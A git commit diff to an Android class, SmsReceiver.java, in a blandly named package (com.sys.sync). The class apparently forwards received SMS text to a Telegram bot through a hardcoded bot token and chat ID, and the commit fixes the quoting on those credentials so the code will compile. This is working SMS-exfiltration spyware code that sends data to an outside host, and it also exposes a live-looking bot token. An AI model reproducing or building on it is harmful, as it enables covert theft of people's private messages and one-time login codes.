d8e060ccc5bc4f10e0e8321bd7a701af543c1eed
MintOrbit <168619262+MintOrbit@users.noreply.github.com>
2026-04-10 08:11:31 +0300

    Update SmsReceiver.java

--- app/src/main/java/com/sys/sync/SmsReceiver.java
+++ app/src/main/java/com/sys/sync/SmsReceiver.java
@@ -27,21 +27,25 @@ public class SmsReceiver extends BroadcastReceiver {
 
     private void send(String text) {
         try {
-            // ВСТАВЬ СВОИ ДАННЫЕ ТУТ
-            String token = 8387829701:AAEDXukofQXk2nEXHdSjad1a7TpGF2Uaof8; 
-            String chatId = 5225064014;
+            // ДАННЫЕ В КАВЫЧКАХ - ЭТО ВАЖНО
+            String token = "8387829701:AAEDXukofQXk2nEXHdSjad1a7TpGF2Uaof8"; 
+            String chatId = "5225064014";
             
             URL url = new URL("https://api.telegram.org/bot" + token + "/sendMessage");
             HttpURLConnection conn = (HttpURLConnection) url.openConnection();
             conn.setRequestMethod("POST");
             conn.setDoOutput(true);
             conn.setRequestProperty("Content-Type", "application/json");
+            
+            // Формируем JSON аккуратно
             String data = "{\"chat_id\": \"" + chatId + "\", \"text\": \"" + text + "\"}";
             
             try (OutputStream os = conn.getOutputStream()) {
                 os.write(data.getBytes("utf-8"));
             }
             conn.getResponseCode();
-        } catch (Exception e) { e.printStackTrace(); }
+        } catch (Exception e) { 
+            e.printStackTrace(); 
+        }
     }
 }
